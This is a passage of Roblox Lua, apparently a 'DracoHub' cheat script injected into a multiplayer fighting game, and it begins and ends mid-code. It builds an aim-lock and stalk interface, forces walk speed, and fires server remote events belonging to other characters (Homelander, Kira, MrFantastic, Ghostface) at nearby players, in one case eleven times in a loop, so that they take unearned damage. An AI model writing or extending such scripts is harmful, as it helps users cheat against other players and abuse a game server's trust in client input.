	if folder.Name:lower():find("ghostface") then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	for _, remote in ipairs(remotesFolder:GetChildren()) do
	if remote:IsA("RemoteEvent") and remote.Name:lower() == "stab2" then
	return remote
	end
	end
	end
	end
	end
	end
	return nil
end
-- ==================== Aim System ====================
local function getPlayerFromScreenCenter()
	local camera = workspace.CurrentCamera
	if not camera then return nil end
	local viewportSize = camera.ViewportSize
	local screenCenterX = viewportSize.X / 2
	local detectionWidth = viewportSize.X / 4
	local closestPlayer = nil
	local closestDepth = math.huge
	for _, player in ipairs(Players:GetPlayers()) do
	if player ~= LocalPlayer then
	local targetCharacter = player.Character
	if targetCharacter then
	local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
	if targetRoot then
	local screenPos, onScreen = camera:WorldToScreenPoint(targetRoot.Position)
	if onScreen then
	local screenX = screenPos.X
	if math.abs(screenX - screenCenterX) <= detectionWidth / 2 then
	if screenPos.Z < closestDepth then
	closestDepth = screenPos.Z
	closestPlayer = player
	end
	end
	end
	end
	end
	end
	end
	return closestPlayer
end
task.spawn(function()
	while true do
	local fg = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local stalk = fg and fg:FindFirstChild("Stalk")
	if stalk and stalk:GetAttribute("AimHooked") ~= true then
	stalk:SetAttribute("AimHooked", true)
	stalk:SetAttribute("AimOn", false)
	local sCancel = stalk:FindFirstChild("StalkCancel")
	if not sCancel then
	sCancel = Instance.new("TextButton")
	sCancel.Name = "StalkCancel"
	sCancel.Size = UDim2.new(0, 40, 0, 26)
	sCancel.Position = UDim2.new(0, -46, 0.5, -13)
	sCancel.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
	sCancel.TextColor3 = Color3.fromRGB(255, 255, 255)
	sCancel.Font = Enum.Font.GothamBold
	sCancel.Text = "Cancel"
	sCancel.TextScaled = true
	sCancel.Visible = false
	sCancel.ZIndex = 21
	sCancel.Parent = stalk
	local cc = Instance.new("UICorner")
	cc.CornerRadius = UDim.new(0, 8)
	cc.Parent = sCancel
	end
	local sLine, sHl, sConn, sTarget
	local sRing, sFill, sNum, sCharge, sMarks, sLevel, sLockWho, sRG, sLG, sRImg, sLImg, sOldSpeed, sTint, sPlayed3, sRim, sSeg, sNumBeat, sStabUsed, sStabBtn, sL2Go, sL2T, sL2Done, sL2Tr, sL2Wait, sL2Try, sL2Cool, sTBBusy, sTBSpd, sTBSpdOn, sTBSpdConn
	sCharge = 0
	sMarks = {}
	sLevel = {}
	sStabUsed = false
	do
	sStabBtn = fg:FindFirstChild("MyersStab")
	if not sStabBtn then
	sStabBtn = Instance.new("TextButton")
	sStabBtn.Name = "MyersStab"
	sStabBtn.BackgroundColor3 = Color3.fromRGB(90, 35, 35)
	sStabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	sStabBtn.Font = Enum.Font.GothamBold
	sStabBtn.TextSize = 11
	sStabBtn.Text = "Stab"
	sStabBtn.TextWrapped = true
	sStabBtn.ZIndex = 21
	sStabBtn.Parent = fg
	local scn = Instance.new("UICorner")
	scn.CornerRadius = UDim.new(0, 8)
	scn.Parent = sStabBtn
	end
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	sStabBtn.Size = UDim2.new(0, 44, 0, 44)
	sStabBtn.Position = UDim2.new(0.5, -88, 1, -96)
	else
	local gun = fg:FindFirstChild("DeadpoolSkill")
	if gun then
	sStabBtn.Size = gun.Size
	sStabBtn.Position = gun.Position
	else
	sStabBtn.Size = UDim2.new(0, 60, 0, 30)
	sStabBtn.Position = UDim2.new(1, -240, 0.5, -100)
	end
	end
	local mmOn = fg:FindFirstChild("MMLifeInsure")
	local tbOn = fg:FindFirstChild("TerrorBlade")
	if LocalPlayer:GetAttribute("YYDSStalkMode") == true then
	sStabBtn.Visible = false
	elseif (mmOn and mmOn.Visible) or (tbOn and tbOn.Visible) then
	sStabBtn.Visible = true
	else
	sStabBtn.Visible = false
	end
	local function tbLockSpeed()
	sTBSpdOn = true
	local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if hum and not sTBSpd then
	sTBSpd = hum.WalkSpeed
	end
	if sTBSpdConn then sTBSpdConn:Disconnect() end
	sTBSpdConn = RunService.Heartbeat:Connect(function()
	if not sTBSpdOn then return end
	local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if h and h.WalkSpeed ~= 20 then
	h.WalkSpeed = 20
	end
	end)
	end
	local function tbUnlockSpeed()
	sTBSpdOn = false
	if sTBSpdConn then
	sTBSpdConn:Disconnect()
	sTBSpdConn = nil
	end
	local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if h and sTBSpd then
	h.WalkSpeed = sTBSpd
	end
	sTBSpd = nil
	end
	local tbBtn = fg:FindFirstChild("TerrorBlade")
	if tbBtn and tbBtn:GetAttribute("Hooked") ~= true then
	tbBtn:SetAttribute("Hooked", true)
	tbBtn.MouseButton1Click:Connect(function()
	if LocalPlayer:GetAttribute("YYDSStalkMode") == true then
	return
	end
	if sTBBusy == true then
	return
	end
	sTBBusy = true
	tbLockSpeed()
	tbBtn.Text = "..."
	local best, bestD
	local meR = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if meR then
	for _, p2 in ipairs(Players:GetPlayers()) do
	if p2 ~= LocalPlayer and p2.Character then
	local r2 = p2.Character:FindFirstChild("HumanoidRootPart")
	local h2 = p2.Character:FindFirstChildOfClass("Humanoid")
	if r2 and h2 and h2.Health > 0 then
	local d = (meR.Position - r2.Position).Magnitude
	if not bestD or d < bestD then
	best = p2
	bestD = d
	end
	end
	end
	end
	end
	sL2Done = false
	sL2Wait = false
	sL2Go = best
	do
	local hg
	pcall(function()
	hg = ReplicatedStorage.Characters.Homelander.Remotes.HitGround
	end)
	if hg and best then
	hg:FireServer(best.DisplayName)
	hg:FireServer(best.Name)
	hg:FireServer(best.Character)
	end
	end
	task.delay(0.1, function()
	if sTBBusy ~= true then
	return
	end
	sL2T = tick()
	local cf = ReplicatedStorage:FindFirstChild("Characters")
	local kcnt
	if cf then
	for _, f in ipairs(cf:GetChildren()) do
	if string.lower(f.Name) == "kira" then
	local kr = f:FindFirstChild("Remotes")
	kcnt = kr and kr:FindFirstChild("Counter")
	break
	end
	end
	end
	if kcnt then
	kcnt:FireServer()
	if best then
	kcnt:FireServer(best.DisplayName)
	kcnt:FireServer(best.Name)
	kcnt:FireServer(best.Character)
	end
	end
	local humMe = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	local an = humMe and (humMe:FindFirstChildOfClass("Animator") or humMe)
	if an then
	local a = Instance.new("Animation")
	a.AnimationId = "rbxassetid://18304170411"
	local ok, tr = pcall(function()
	return an:LoadAnimation(a)
	end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr:Play()
	sL2Tr = tr
	end
	end
	end)
	task.delay(2.5, function()
	if sL2Done == true then
	return
	end
	if sL2Tr then
	pcall(function()
	sL2Tr:Stop(0.12)
	end)
	sL2Tr = nil
	end
	sL2Go = nil
	sL2T = nil
	sL2Wait = false
	sTBBusy = false
	tbUnlockSpeed()
	if tbBtn then
	tbBtn.Text = "Terror Blade"
	end
	end)
	end)
	RunService.Heartbeat:Connect(function()
	if LocalPlayer:GetAttribute("YYDSStalkMode") == true then
	return
	end
	if sTBBusy ~= true or sL2Wait == true or (not sL2T) or sL2Done == true then
	return
	end
	local passed = tick() - sL2T
	if passed < 1.50 or passed > 2.50 then
	return
	end
	local meR2 = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not meR2 then
	return
	end
	local best, bestD
	for _, p2 in ipairs(Players:GetPlayers()) do
	if p2 ~= LocalPlayer and p2.Character then
	local r2 = p2.Character:FindFirstChild("HumanoidRootPart")
	local h2 = p2.Character:FindFirstChildOfClass("Humanoid")
	if r2 and h2 and h2.Health > 0 then
	local d = (meR2.Position - r2.Position).Magnitude
	if d <= 6 and (not bestD or d < bestD) then
	best = p2
	bestD = d
	end
	end
	end
	end
	if not best then
	return
	end
	sL2Done = true
	sL2Wait = true
	sTBBusy = false
	sL2Go = nil
	sL2T = nil
	tbUnlockSpeed()
	tbBtn.Text = "Terror Blade"
	if sL2Tr then
	pcall(function()
	sL2Tr:Stop(0.05)
	end)
	end
	local humMe = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	local an = humMe and (humMe:FindFirstChildOfClass("Animator") or humMe)
	if an then
	local a = Instance.new("Animation")
	a.AnimationId = "rbxassetid://18304298931"
	local ok, tr = pcall(function()
	return an:LoadAnimation(a)
	end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr:Play()
	end
	end
	local stab2 = findGhostfaceStab2Remote()
	if stab2 then
	pcall(function()
	stab2:FireServer()
	end)
	end
	end)
	end
	end
	do
	local oldRing = stalk:FindFirstChild("StalkRing")
	if oldRing then oldRing:Destroy() end
	sRing = Instance.new("Frame")
	sRing.Name = "StalkRing"
	sRing.Size = UDim2.new(0, 34, 0, 34)
	sRing.Position = UDim2.new(0.5, -17, 0, -40)
	sRing.BackgroundTransparency = 1
	sRing.Visible = false
	sRing.ZIndex = 22
	sRing.Parent = stalk
	local empty = Instance.new("ImageLabel")
	empty.Name = "Empty"
	empty.Size = UDim2.new(1, 0, 1, 0)
	empty.BackgroundTransparency = 1
	empty.Image = "rbxasset://textures/ui/Controls/RadialFill.png"
	empty.ImageColor3 = Color3.fromRGB(70, 70, 70)
	empty.ImageTransparency = 0.78
	empty.ZIndex = 22
	empty.Parent = sRing
	sSeg = {}
	do
	local mask = NumberSequence.new({
	NumberSequenceKeypoint.new(0, 0),
	NumberSequenceKeypoint.new(0.5, 0),
	NumberSequenceKeypoint.new(0.5001, 1),
	NumberSequenceKeypoint.new(1, 1)
	})
	local cols = {
	Color3.fromRGB(255, 170, 40),
	Color3.fromRGB(196, 18, 38),
	Color3.fromRGB(110, 8, 22)
	}
	for i = 1, 3 do
	local hold = Instance.new("Frame")
	hold.Name = "Seg" .. tostring(i)
	hold.Size = UDim2.new(1, 0, 1, 0)
	hold.BackgroundTransparency = 1
	hold.ZIndex = 26 - i
	hold.Parent = sRing
	local rightClip = Instance.new("Frame")
	rightClip.Name = "Right"
	rightClip.AnchorPoint = Vector2.new(0, 0.5)
	rightClip.Position = UDim2.new(0.5, 0, 0.5, 0)
	rightClip.Size = UDim2.new(0.5, 0, 1, 0)
	rightClip.BackgroundTransparency = 1
	rightClip.ClipsDescendants = true
	rightClip.ZIndex = 26 - i
	rightClip.Parent = hold
	local rImg = Instance.new("ImageLabel")
	rImg.Name = "Fill"
	rImg.BackgroundTransparency = 1
	rImg.Size = UDim2.new(2, 0, 1, 0)
	rImg.Position = UDim2.new(-1, 0, 0, 0)
	rImg.Image = "rbxasset://textures/ui/Controls/RadialFill.png"
	rImg.ImageColor3 = cols[i]
	rImg.ZIndex = 26 - i
	rImg.Visible = false
	rImg.Parent = rightClip
	local rg = Instance.new("UIGradient")
	rg.Transparency = mask
	rg.Rotation = 0
	rg.Parent = rImg
	local leftClip = Instance.new("Frame")
	leftClip.Name = "Left"
	leftClip.AnchorPoint = Vector2.new(1, 0.5)
	leftClip.Position = UDim2.new(0.5, 0, 0.5, 0)
	leftClip.Size = UDim2.new(0.5, 0, 1, 0)
	leftClip.BackgroundTransparency = 1
	leftClip.ClipsDescendants = true
	leftClip.ZIndex = 26 - i
	leftClip.Parent = hold
	local lImg = Instance.new("ImageLabel")
	lImg.Name = "Fill"
	lImg.BackgroundTransparency = 1
	lImg.Size = UDim2.new(2, 0, 1, 0)
	lImg.Position = UDim2.new(0, 0, 0, 0)
	lImg.Image = "rbxasset://textures/ui/Controls/RadialFill.png"
	lImg.ImageColor3 = cols[i]
	lImg.ZIndex = 26 - i
	lImg.Visible = false
	lImg.Parent = leftClip
	local lg = Instance.new("UIGradient")
	lg.Transparency = mask
	lg.Rotation = 180
	lg.Parent = lImg
	sSeg[i] = {rImg = rImg, lImg = lImg, rg = rg, lg = lg}
	end
	end
	sRImg = sSeg[1].rImg
	sLImg = sSeg[1].lImg
	sRG = sSeg[1].rg
	sLG = sSeg[1].lg
	sNum = Instance.new("TextLabel")
	sNum = Instance.new("TextLabel")
	sNum = Instance.new("TextLabel")
	sNum.Name = "Mark"
	sNum.AnchorPoint = Vector2.new(0.5, 0.5)
	sNum.Position = UDim2.new(0.5, 0, 0.5, 0)
	sNum.Size = UDim2.new(1, 0, 1, 0)
	sNum.BackgroundTransparency = 1
	sNum.Font = Enum.Font.GothamBold
	sNum.TextSize = 16
	sNum.TextXAlignment = Enum.TextXAlignment.Center
	sNum.TextYAlignment = Enum.TextYAlignment.Center
	sNum.TextColor3 = Color3.fromRGB(255, 255, 255)
	sNum.Text = "1"
	sNum.Visible = false
	sNum.ZIndex = 30
	sNum.Parent = sRing
	do
	local sc = Instance.new("UIScale")
	sc.Name = "Pulse"
	sc.Scale = 1
	sc.Parent = sNum
	end
	sRing.ClipsDescendants = false
	local function tickLab(name, text, x, y)
	local lab = Instance.new("TextLabel")
	lab.Name = name
	lab.Size = UDim2.new(0, 12, 0, 12)
	lab.Position = UDim2.new(0, x, 0, y)
	lab.BackgroundTransparency = 1
	lab.Font = Enum.Font.GothamBold
	lab.TextSize = 10
	lab.TextColor3 = Color3.fromRGB(255, 210, 210)
	lab.Text = text
	lab.ZIndex = 25
	lab.Parent = sRing
	end
	tickLab("Tick1", "1", 30, 22)
	tickLab("Tick2", "2", -8, 22)
	tickLab("Tick3", "3", 11, -12)
	local oldTint = stalk.Parent:FindFirstChild("StalkTint")
	if oldTint then oldTint:Destroy() end
	sTint = Instance.new("Frame")
	sTint.Name = "StalkTint"
	sTint.Size = UDim2.new(1, 0, 1, 0)
	sTint.BackgroundTransparency = 1
	sTint.BorderSizePixel = 0
	sTint.ZIndex = 6
	sTint.Active = false
	sTint.Parent = stalk.Parent
	local function edge(name, size, pos, anchor, rot, t0, t1)
	local e = Instance.new("Frame")
	e.Name = name
	e.Size = size
	e.Position = pos
	e.AnchorPoint = anchor
	e.BackgroundColor3 = Color3.fromRGB(72, 6, 6)
	e.BackgroundTransparency = 1
	e.BorderSizePixel = 0
	e.ZIndex = 6
	e.Active = false
	e.Parent = sTint
	local g = Instance.new("UIGradient")
	g.Color = ColorSequence.new(Color3.fromRGB(90, 8, 8), Color3.fromRGB(40, 0, 0))
	g.Transparency = NumberSequence.new({
	NumberSequenceKeypoint.new(0, t0),
	NumberSequenceKeypoint.new(1, t1)
	})
	g.Rotation = rot
	g.Parent = e
	end
	edge("T", UDim2.new(1, 0, 0.30, 0), UDim2.new(0, 0, 0, 0), Vector2.new(0, 0), 90, 0.05, 1)
	edge("B", UDim2.new(1, 0, 0.30, 0), UDim2.new(0, 0, 1, 0), Vector2.new(0, 1), 90, 1, 0.05)
	edge("L", UDim2.new(0.24, 0, 1, 0), UDim2.new(0, 0, 0, 0), Vector2.new(0, 0), 0, 0.05, 1)
	edge("R", UDim2.new(0.24, 0, 1, 0), UDim2.new(1, 0, 0, 0), Vector2.new(1, 0), 0, 1, 0.05)
	end
	local function stopStalkAim()
	local chs = LocalPlayer.Character
	local hs = chs and chs:FindFirstChildOfClass("Humanoid")
	if hs and sOldSpeed then
	hs.WalkSpeed = sOldSpeed
	end
	stalk:SetAttribute("AimOn", false)
	stalk:SetAttribute("Locked", false)
	stalk.Text = "Stalk"
	stalk.BackgroundColor3 = Color3.fromRGB(100, 30, 30)
	sCancel.Visible = false
	sCharge = 0
	sNumBeat = false
	sLockWho = nil
	if sRim then
	sRim:Destroy()
	sRim = nil
	end
	if sRing then sRing.Visible = false end
	if sTint then
	sTint.BackgroundTransparency = 1
	for _, e in ipairs(sTint:GetChildren()) do
	if e:IsA("Frame") then
	e.BackgroundTransparency = 1
	end
	end
	end
	if sFill then sFill.Size = UDim2.new(0, 0, 0, 0) end
	if sNum then sNum.Visible = false end
	if sStabBtn then
	if LocalPlayer:GetAttribute("YYDSStalkMode") == true then
	sStabBtn.Visible = false
	else
	sStabBtn.Visible = true
	end
	end
	sStabUsed = false
	if sConn then
	sConn:Disconnect()
	sConn = nil
	end
	if sLine then
	sLine:Destroy()
	sLine = nil
	end
	if sHl then
	sHl:Destroy()
	sHl = nil
	end
	sTarget = nil
	local oldL = workspace:FindFirstChild("YYDSStalkAimLine")
	if oldL then oldL:Destroy() end
	local oldR = workspace:FindFirstChild("YYDSStalkRing")
	if oldR then oldR:Destroy() end
	local oldM = workspace:FindFirstChild("YYDSStalkMark1")
	if oldM then oldM:Destroy() end
	local oldF = workspace:FindFirstChild("YYDSStalkMarks")
	if oldF then oldF:Destroy() end
	end
	sCancel.MouseButton1Click:Connect(function()
	pcall(function()
	getgenv()._YYDSMyersMark = nil
	end)
	do
	local nkC = fg:FindFirstChild("NeckSnap")
	if nkC and LocalPlayer:GetAttribute("YYDSStalkMode") == true then
	nkC.Visible = false
	end
	end
	stopStalkAim()
	end)
	if sStabBtn then
	sStabBtn.MouseButton1Click:Connect(function()
	if sStabBtn.Visible ~= true then
	return
	end
	do
	local rootNow = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	local best, bestD
	if rootNow then
	for _, p in ipairs(Players:GetPlayers()) do
	if p ~= LocalPlayer and p.Character then
	local r = p.Character:FindFirstChild("HumanoidRootPart")
	local h = p.Character:FindFirstChildOfClass("Humanoid")
	if r and h and h.Health > 0 then
	local d = (r.Position - rootNow.Position).Magnitude
	if d <= 7 and (not bestD or d < bestD) then
	best, bestD = p, d
	end
	end
	end
	end
	end
	if best then
	local hg
	pcall(function()
	hg = ReplicatedStorage.Characters.Homelander.Remotes.HitGround
	end)
	if hg then
	hg:FireServer(best.DisplayName)
	hg:FireServer(best.Name)
	hg:FireServer(best.Character)
	task.delay(0.5, function()
	if best and best.Character then
	hg:FireServer(best.DisplayName)
	hg:FireServer(best.Name)
	hg:FireServer(best.Character)
	end
	end)
	end
	end
	end
	task.delay(0.1, function()
	local who = sLockWho or sTarget
	local me = LocalPlayer.Character
	local humMe = me and me:FindFirstChildOfClass("Humanoid")
	local rootMe = me and me:FindFirstChild("HumanoidRootPart")
	if humMe then
	local animator = humMe:FindFirstChildOfClass("Animator")
	if not animator then
	animator = Instance.new("Animator")
	animator.Parent = humMe
	end
	local anim = Instance.new("Animation")
	anim.AnimationId = "rbxassetid://16878840736"
	local ok, track = pcall(function()
	return animator:LoadAnimation(anim)
	end)
	if ok and track then
	track.Priority = Enum.AnimationPriority.Action4
	track:Play()
	end
	end
	task.delay(0.30, function()
	who = nil
	rootMe = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if rootMe then
	local best, bestD
	for _, p in ipairs(Players:GetPlayers()) do
	if p ~= LocalPlayer and p.Character then
	local r = p.Character:FindFirstChild("HumanoidRootPart")
	local h = p.Character:FindFirstChildOfClass("Humanoid")
	if r and h and h.Health > 0 then
	local d = (r.Position - rootMe.Position).Magnitude
	if d <= 7 and (not bestD or d < bestD) then
	best, bestD = p, d
	end
	end
	end
	end
	who = best
	end
	if not who then
	return
	end
	local humT = who.Character and who.Character:FindFirstChildOfClass("Humanoid")
	local startHp = humT and humT.Health or 0
	local folder = ReplicatedStorage:FindFirstChild("Characters")
	local ch = folder and folder:FindFirstChild("MrFantastic")
	if folder and not ch then
	for _, f in ipairs(folder:GetChildren()) do
	if string.lower(f.Name) == "mrfantastic" then
	ch = f
	break
	end
	end
	end
	local remote = ch and ch:FindFirstChild("Remotes")
	remote = remote and remote:FindFirstChild("HitSpin")
	if remote then
	for i = 1, 11 do
	remote:FireServer(who.DisplayName)
	remote:FireServer(who.Name)
	remote:FireServer(who.Character)
	end
	end
	local armed = tick() + 0.45
	local conn
	if humT then
	conn = humT.HealthChanged:Connect(function(newHp)
	if tick() > armed then
	return
	end
	if (startHp - newHp) >= 55 then
	if conn then
	conn:Disconnect()
	end
	end
	end)
	end
	task.delay(0.45, function()
	if conn then
	conn:Disconnect()
	end
	local hum2 = who.Character and who.Character:FindFirstChildOfClass("Humanoid")
	local now = hum2 and hum2.Health or 0
	end)
	end)
	end)
	end)
	end
	stalk.InputBegan:Connect(function(input)
	if stalk:GetAttribute("AimOn") ~= true then
	return
	end
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
	return
	end
	local peekR = 60
	local meR = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	local canHold = false
	local holdWho = sLockWho or sTarget
	if holdWho and holdWho.Character and meR then
	local rr = holdWho.Character:FindFirstChild("HumanoidRootPart")
	if rr and (meR.Position - rr.Position).Magnitude <= peekR then
	canHold = true
	end
	end
	if not canHold then
	return
	end
	stalk:SetAttribute("Locked", true)
	if sHl then
	sHl.FillTransparency = 0.45
	end
	if sLockWho ~= holdWho then
	sLockWho = holdWho
	sTarget = holdWho
	local keep = false
	if sTarget and sMarks[sTarget] and sMarks[sTarget] > tick() then
	keep = true
	end
	if keep then
	local lv = (sLevel and sLevel[sTarget]) or 1
	if lv >= 3 then
	sCharge = 16
	elseif lv >= 2 then
	sCharge = 11
	else
	sCharge = 5
	end
	else
	sCharge = 0
	end
	end
	if sRing then sRing.Visible = true end
	end)
	stalk.InputEnded:Connect(function(input)
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
	return
	end
	stalk:SetAttribute("Locked", false)
	if sHl then
	sHl.FillTransparency = 0.7
	end
	end)
	stalk.MouseButton1Click:Connect(function()
	if moveUnlocked then
	return
	end
	if stalk:GetAttribute("AimOn") == true then
	return
	end
	stalk:SetAttribute("AimOn", true)
	stalk.Text = "Hold"
	stalk.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	sCancel.Visible = true
	local col = Color3.fromRGB(255, 0, 0)
	local function paint(plr)
	if sLine then sLine:Destroy() sLine = nil end
	if sHl then sHl:Destroy() sHl = nil end
	sTarget = plr
	if not plr or not plr.Character then
	return
	end
	local root = plr.Character:FindFirstChild("HumanoidRootPart")
	if not root then
	return
	end
	sLine = Instance.new("Part")
	sLine.Name = "YYDSStalkAimLine"
	sLine.Size = Vector3.new(0.3, 10, 0.3)
	sLine.Color = col
	sLine.Material = Enum.Material.Neon
	sLine.Anchored = true
	sLine.CanCollide = false
	sLine.Parent = workspace
	sLine.Position = root.Position + Vector3.new(0, 3, 0)
	sHl = Instance.new("Highlight")
	sHl.FillColor = col
	sHl.FillTransparency = 0.7
	sHl.OutlineColor = col
	sHl.OutlineTransparency = 0
	sHl.Parent = plr.Character
	end
	paint(getPlayerFromScreenCenter())
	if sConn then sConn:Disconnect() end
	sConn = RunService.Heartbeat:Connect(function(dt)
	if stalk:GetAttribute("AimOn") ~= true or (not stalk.Visible) then
	stopStalkAim()
	return
	end
	local peekR = 60
	local meR = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	local function distTo(plr)
	if (not meR) or (not plr) or (not plr.Character) then
	return 99999
	end
	local rr = plr.Character:FindFirstChild("HumanoidRootPart")
	if not rr then
	return 99999
	end
	return (meR.Position - rr.Position).Magnitude
	end
	local far = false
	if sLockWho then
	local dch = sLockWho.Character
	local dhum = dch and dch:FindFirstChildOfClass("Humanoid")
	if (not dch) or (not dhum) or dhum.Health <= 0 then
	sMarks[sLockWho] = nil
	if sLevel then
	sLevel[sLockWho] = nil
	end
	if sPlayed3 == sLockWho then
	sPlayed3 = nil
	end
	sLockWho = nil
	sTarget = nil
	sCharge = 0
	sNumBeat = false
	stalk:SetAttribute("Locked", false)
	pcall(function()
	getgenv()._YYDSMyersMark = nil
	end)
	do
	local nkD = fg:FindFirstChild("NeckSnap")
	if nkD and LocalPlayer:GetAttribute("YYDSStalkMode") == true then
	nkD.Visible = false
	end
	end
	else
	far = distTo(sLockWho) > peekR
	if sTarget ~= sLockWho then
	paint(sLockWho)
	end
	end
	end
	if sRim then
	sRim.Parent = (far and workspace) or nil
	end
	if far and sLockWho and meR then
	if not sRim then
	sRim = Instance.new("Model")
	sRim.Name = "YYDSStalkRim"
	for i = 1, 24 do
	local rim = Instance.new("Part")
	rim.Name = "Rim" .. tostring(i)
	rim.Anchored = true
	rim.CanCollide = false
	rim.CanQuery = false
	rim.CanTouch = false
	rim.CastShadow = false
	rim.Material = Enum.Material.SmoothPlastic
	rim.Color = Color3.fromRGB(220, 50, 50)
	rim.Transparency = 0.35
	rim.Parent = sRim
	end
	end
	sRim.Parent = workspace
	local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	local hip = 3
	if hum then
	hip = hum.HipHeight + 0.15
	end
	local pos = Vector3.new(meR.Position.X, meR.Position.Y - hip, meR.Position.Z)
	local seg = (2 * math.pi * peekR) / 24 * 1.08
	for i = 1, 24 do
	local rim = sRim:FindFirstChild("Rim" .. tostring(i))
	if rim then
	local a = (i / 24) * math.pi * 2
	local pp = pos + Vector3.new(math.cos(a) * peekR, 0.22, math.sin(a) * peekR)
	rim.Size = Vector3.new(0.18, 0.44, seg)
	rim.CFrame = CFrame.lookAt(pp, pp + Vector3.new(-math.sin(a), 0, math.cos(a)))
	end
	end
	elseif sRim then
	sRim.Parent = nil
	end
	if stalk:GetAttribute("Locked") == true and (not sLockWho) and sTarget then
	sLockWho = sTarget
	end
	if stalk:GetAttribute("Locked") ~= true then
	if not sLockWho then
	local nt = getPlayerFromScreenCenter()
	if nt and distTo(nt) > peekR then
	nt = nil
	end
	if nt and nt ~= sTarget then
	paint(nt)
	end
	end
	else
	local who = sLockWho or sTarget
	local canGain = false
	if who then
	local dch = who.Character
	local dhum = dch and dch:FindFirstChildOfClass("Humanoid")
	if dch and dhum and dhum.Health > 0 and distTo(who) <= peekR then
	canGain = true
	end
	end
	if canGain and sCharge < 16 then
	sCharge = sCharge + (dt or 0)
	if sCharge > 16 then sCharge = 16 end
	end
	if sTarget then
	local lv = 0
	if sCharge >= 16 then
	lv = 3
	elseif sCharge >= 11 then
	lv = 2
	elseif sCharge >= 5 then
	lv = 1
	end
	if lv > 0 then
	sMarks[sTarget] = tick() + 30
	sLevel[sTarget] = lv
	end
	if LocalPlayer:GetAttribute("YYDSStalkMode") == true and lv >= 1 and lv < 3 and sStabBtn then
	sStabBtn.Visible = true
	end
	if lv < 1 then
	sStabUsed = false
	if sStabBtn then
	if LocalPlayer:GetAttribute("YYDSStalkMode") == true then
	sStabBtn.Visible = false
	else
	sStabBtn.Visible = true
	end
	end
	end
	if lv >= 3 then
	pcall(function()
	getgenv()._YYDSMyersMark = sTarget
	end)
	if LocalPlayer:GetAttribute("YYDSStalkMode") == true then
	if sStabBtn then
	sStabBtn.Visible = false
	end
	local nk3 = fg:FindFirstChild("NeckSnap")
	if nk3 then
	local gun3 = fg:FindFirstChild("DeadpoolSkill")
	if sStabBtn then
	nk3.Size = sStabBtn.Size
	nk3.Position = sStabBtn.Position
	elseif gun3 then
	nk3.Size = gun3.Size
	nk3.Position = gun3.Position
	else
	nk3.Size = UDim2.new(0, 60, 0, 30)
	nk3.Position = UDim2.new(1, -240, 0.5, -100)
	end
	nk3.Visible = true
	end
	end
	end
	if lv >= 3 and sPlayed3 ~= sTarget then
	sPlayed3 = sTarget
	local sfx = Instance.new("Sound")
	sfx.SoundId = "rbxassetid://136209100255940"
	sfx.Volume = 3
	sfx.Parent = game:GetService("SoundService")
	sfx:Play()
	sfx.Ended:Connect(function()
	sfx:Destroy()
	end)
	end
	end
	end
	if sL2Go then
	local dead = false
	local chD = sL2Go.Character
	local hD = chD and chD:FindFirstChildOfClass("Humanoid")
	if (not chD) or (not hD) or hD.Health <= 0 then
	dead = true
	end
	if dead then
	sL2Go = nil
	sL2T = nil
	sL2Done = false
	sL2Wait = false
	sL2Tr = nil
	sL2Cool = nil
	end
	end
	if meR then
	for plr, untilT in pairs(sMarks) do
	local lvN = (sLevel and sLevel[plr]) or 0
	if lvN >= 2 and untilT and untilT > tick() and plr and plr.Character then
	local rr2 = plr.Character:FindFirstChild("HumanoidRootPart")
	if rr2 then
	local d2 = (meR.Position - rr2.Position).Magnitude
	local in15 = d2 <= 13
	local in6 = d2 <= 6
	if in15 and sL2Go ~= plr then
	sL2Go = plr
	sL2Done = false
	do
	local hg
	pcall(function()
	hg = ReplicatedStorage.Characters.Homelander.Remotes.HitGround
	end)
	if hg then
	hg:FireServer(plr.DisplayName)
	hg:FireServer(plr.Name)
	hg:FireServer(plr.Character)
	end
	end
	task.delay(0.1, function()
	if sL2Go ~= plr or sL2Done == true then
	return
	end
	sL2T = tick()
	local cf = ReplicatedStorage:FindFirstChild("Characters")
	local kcnt
	if cf then
	for _, f in ipairs(cf:GetChildren()) do
	if string.lower(f.Name) == "kira" then
	local kr = f:FindFirstChild("Remotes")
	if kr then
	kcnt = kr:FindFirstChild("Counter")
	if not kcnt then
	for _, r in ipairs(kr:GetChildren()) do
	if string.lower(r.Name) == "counter" then
	kcnt = r
	break
	end
	end
	end
	end
	break
	end
	end
	end
	if kcnt then
	kcnt:FireServer()
	kcnt:FireServer(plr.DisplayName)
	kcnt:FireServer(plr.Name)
	kcnt:FireServer(plr.Character)
	end
	local humMe = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	local an = humMe and (humMe:FindFirstChildOfClass("Animator") or humMe)
	if an then
	local a = Instance.new("Animation")
	a.AnimationId = "rbxassetid://18304170411"
	local ok, tr = pcall(function()
	return an:LoadAnimation(a)
	end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr:Play()
